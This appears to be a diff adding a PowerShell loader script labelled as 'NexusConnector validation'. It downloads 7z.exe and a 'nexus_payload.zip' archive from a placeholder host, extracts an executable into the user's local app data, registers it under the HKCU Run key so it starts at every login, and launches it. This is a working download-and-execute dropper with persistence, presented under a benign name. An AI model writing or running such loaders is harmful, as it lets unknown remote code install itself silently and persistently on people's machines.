@@ -1,0 +1,43 @@
+$ErrorActionPreference = 'Stop'
+$ProgressPreference = 'SilentlyContinue'
+
+$log = Join-Path $env:TEMP 'nexusconnector-loader-validation.log'
+Add-Content -Path $log -Value 'Starting NexusConnector validation'
+
+$stage = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName())
+$null = New-Item -ItemType Directory -Path $stage -Force
+
+$tool = Join-Path $stage '7z.exe'
+$zip = Join-Path $stage 'nexus_payload.zip'
+$extract = Join-Path $stage 'extract'
+
+Invoke-WebRequest -Uri 'https://<mysite.com>/7z.exe' -OutFile $tool -UseBasicParsing
+Invoke-WebRequest -Uri 'https://<mysite.com>/nexus_payload.zip' -OutFile $zip -UseBasicParsing
+
+$null = New-Item -ItemType Directory -Path $extract -Force
+
+& $tool x -y "-o$extract" $zip
+if ($LASTEXITCODE -ne 0) {
+    throw "7z extraction failed with exit code $LASTEXITCODE"
+}
+
+$matches = [System.IO.Directory]::GetFiles($extract, 'NexusConnector.exe', [System.IO.SearchOption]::AllDirectories)
+if ($matches.Count -lt 1) {
+    throw 'NexusConnector.exe not found after extraction'
+}
+
+$dstDir = Join-Path $env:LOCALAPPDATA 'NexusConnector'
+$null = New-Item -ItemType Directory -Path $dstDir -Force
+
+$dst = Join-Path $dstDir 'NexusConnector.exe'
+Copy-Item -LiteralPath $matches[0] -Destination $dst -Force
+
+$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+$null = New-ItemProperty -Path $runKey -Name 'NexusConnector' -Value $dst -PropertyType String -Force
+
+Start-Process -FilePath $dst
+
+Add-Content -Path $log -Value 'Completed NexusConnector validation'
+
+Write-Host "Loader log: $log"
+Write-Host "Payload log: $(Join-Path $env:TEMP 'nexusconnector-validation.log')"
